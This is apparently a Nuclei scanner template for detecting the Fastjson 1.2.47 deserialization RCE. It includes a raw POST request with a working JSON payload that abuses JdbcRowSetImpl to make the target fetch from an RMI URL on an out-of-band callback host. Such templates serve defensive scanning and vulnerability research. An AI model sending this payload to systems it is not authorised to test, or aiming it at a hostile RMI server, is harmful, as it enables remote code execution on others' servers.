id: fastjson-1.2.47-rce
info:
  author: zh
  name: Fastjson 1.2.47 Deserialization RCE
  reference:
  - https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce
  - https://www.freebuf.com/vuls/208339.html
  - https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
  - https://github.com/wyzxxz/fastjson_rce_tool
  severity: critical
  tags: fastjson,rce,deserialization,oast
requests:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - condition: and
    type: word
    words:
    - Bad Request
    - '400'
  matchers-condition: and
  raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \
    \  \"a\":{\n        \"@type\":\"java.lang.Class\",\n        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\
    \n    },\n    \"b\":{\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n\
    \        \"dataSourceName\":\"rmi://{{interactsh-url}}/Exploit\",\n        \"\
    autoCommit\":true\n    }\n}\n"
